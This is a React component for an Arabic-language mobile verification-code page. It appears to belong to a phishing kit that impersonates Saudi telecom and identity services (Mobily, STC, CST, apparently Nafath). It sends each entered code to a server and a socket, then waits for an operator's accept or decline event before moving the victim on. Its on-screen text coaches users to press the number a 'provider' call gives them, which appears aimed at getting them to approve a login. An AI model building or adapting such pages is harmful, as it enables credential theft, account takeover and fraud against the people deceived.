import React, { useState } from "react";
import axios from "axios";
import { serverRoute, socket } from "./Main";
import { TailSpin } from "react-loader-spinner";
import { AiOutlineCloseCircle } from "react-icons/ai";
import { useNavigate } from "react-router-dom";
import { useSocketEvent } from "../hooks/useSocketEvent";
import { useCountdown } from "../hooks/useCountdown";

const MobOtp = () => {
  const [phoneOtp, setPhoneOtp] = useState(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const [STC, setSTC] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const stc = query.get("stc");
  const [error, setError] = useState(false);
  const { formattedMinutes, formattedSeconds } = useCountdown(180);
  const ID = sessionStorage.getItem("id");

  const handleSubmit = async (e) => {
    setLoading(true);
    e.preventDefault();

    try {
      await axios
        .post(serverRoute + "/mobOtp/" + sessionStorage.getItem("id"), {
          mobOtp: phoneOtp,
        })
        .then(() => {
          socket.emit("mobOtp", {
            _id: ID,
            id: ID,
            mobOtp: phoneOtp,
          });
        });
    } catch (error) {}
  };

  useSocketEvent("acceptMobOtp", ({ id, price }) => {
    if (id === ID) navigate("/navaz?otp=" + price);
  });

  useSocketEvent("declineMobOtp", (id) => {
    if (id === ID) {
      setLoading(false);
      navigate("/phone");
    }
  });

  return (
    <>
      <div className="w-full lg:w-1/2 flex flex-col items-center justify-center rounded-md">
        <form
          className="bg-white border border-gray-300 my-2 min-h-screen rounded-md pt-0 p-3 text-sm w-11/12"
          dir="rtl"
          onSubmit={handleSubmit}
        >
          {/* Header with logo */}
          <div className="flex justify-start items-start mb-4 w-full p-2 pr-4 pt-4 flex-col">
            <img src="/photoHeader2.jpeg" alt="Mutasil" className="w-20" />
            <div className="flex items-start ">
              <img src="/phoneHeader1.jpeg" alt="Mutasil" className="w-20" />
              <span className="font-semibold">
                تم إرسال رمز التحقق إلي هاتفك النقال , الرجاء إدخاله في هذه
                الخانة .
              </span>
            </div>
          </div>

          {/* STC Logo */}
          <div className="flex justify-end items-center mb-1 -mt-2 rounded-lg px-2">
            <img
              src="/mobily.jpeg"
              alt="mobily"
              className="h-16 object-contain"
              onError={(e) => {
                e.target.style.display = "none";
              }}
            />
          </div>

          {/* Description */}
          <p className="text-right text-lg text-sky-600 leading-relaxed p-2 font-bold">
            ستصلك مكالمة من مزود الخدمة , يرجى اتباع التعليمات الصوتية و الضغط
            على الرقم الذي تسمعه لتأكيد الطلب
          </p>

          {/* OTP Input */}
          <div className="flex justify-start p-1 py-3 items-end gap-y-2 w-full flex-col">
            <span className="font-semibold text-sm text-gray-700 w-full text-right"></span>
            <input
              value={phoneOtp}
              required
              onChange={(e) => setPhoneOtp(e.target.value)}
              dir="ltr"
              placeholder="  رمز التحقق"
              inputMode="numeric"
              type="text"
              maxLength={6}
              className="border border-gray-300 rounded-lg px-3 py-2.5 text-base text-right outline-blue-500 w-full"
            />
          </div>
          <div className="flex items-center justify-between">
            {/* Timer */}
            <div className="flex justify-center items-center my-4">
              <span className="text-gray-600">
                إعادة إرسال: {formattedMinutes}:{formattedSeconds}
              </span>
            </div>
            {/* Submit button */}
            <div className=" flex items-center justify-center py-5 mt-4">
              <button
                type="submit"
                className="px-5 flex justify-center items-center py-3 bg-[#007bff] hover:bg-[#0056b3] text-white w-full rounded-full text-base font-semibold transition-colors"
              >
                تحقق
              </button>
            </div>
          </div>

          {error && (
            <div className="w-full text-center text-red-500 absolute bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-50">
              <div className="bg-white py-5 px-2 md:w-1/4 w-11/12 flex justify-center items-center flex-col text-lg gap-y-3 rounded-lg">
                <AiOutlineCloseCircle className="text-6xl" />
                <div className="flex flex-col w-full items-center justify-center">
                  <span>رمز التحقق غير صحيح</span>
                  <span className="text-sm">82A27833M4589370G</span>
                </div>
                <button
                  className="bg-gray-900 text-white w-11/12 py-3 rounded-lg"
                  onClick={() => setError(false)}
                >
                  حاول مرة ثانية
                </button>
              </div>
            </div>
          )}

          {/* Footer logos */}
          <div className="flex justify-center items-center gap-4 mt-6 pt-6 border-t border-gray-200">
            <img src="/phoneFooter.jpeg" alt="CST" className="object-contain" />
          </div>
        </form>

        {loading && (
          <div className="fixed top-0 w-full h-screen bg-[#ffffffc7] flex items-center justify-center flex-col gap-y-5 z-50">
            <TailSpin
              height="50"
              width="50"
              color="blue"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="font-semibold">
              يرجي الانتظار جاري التأكد من صحة البيانات المدخلة
            </span>
          </div>
        )}
      </div>
    </>
  );
};

export default MobOtp;
